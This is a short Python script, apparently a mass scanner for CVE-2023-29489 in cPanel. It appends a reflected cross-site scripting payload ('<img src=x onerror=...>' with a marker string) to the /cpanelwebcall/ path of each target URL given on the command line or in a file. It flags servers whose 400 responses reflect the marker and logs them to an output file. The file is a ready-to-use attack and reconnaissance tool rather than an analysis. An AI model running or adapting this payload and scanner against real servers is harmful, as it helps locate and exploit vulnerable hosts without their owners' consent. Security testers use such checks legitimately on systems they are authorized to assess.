import argparse
import requests

parser = argparse.ArgumentParser(description="This is a tool for cve-2023-29489")

parser.add_argument('-u','--url',metavar='URL to scan')
parser.add_argument('-i','--input',metavar='input_file to scan',help="Pass input file name")
parser.add_argument('-o','--output',metavar='output_file to write result',help="Pass the output file name")

args = parser.parse_args()

url = args.url
input_file = args.input
output_file = args.output 

def file_reader(input_file,output_file):
    with open(input_file,'r') as file:
        for url in file.readlines():
            scanner(url.strip(),output_file)

def writetofile(vuln_url,outname):
    if outname:
        pass
    else:
        outname = 'output.txt'

    with open(outname,'a') as file:
        file.write(vuln_url+"\n")
        
payloads = ['/cpanelwebcall/<img src=x onerror="prompt(1)">aaaaaaaaaaaa']

def scanner(url,output_file):
    for payload in payloads:
        fullurl = url+payload
        response = requests.get(fullurl)
        if response.status_code == 400:
            if 'aaaaaaaa' in response.text:
                writetofile(fullurl,output_file)
                print("Vulnerable URL -> "+fullurl)




def main():
    if url:
        scanner(url,output_file)
    elif input_file:
        file_reader(input_file,output_file)

if __name__=="__main__":
    main()
    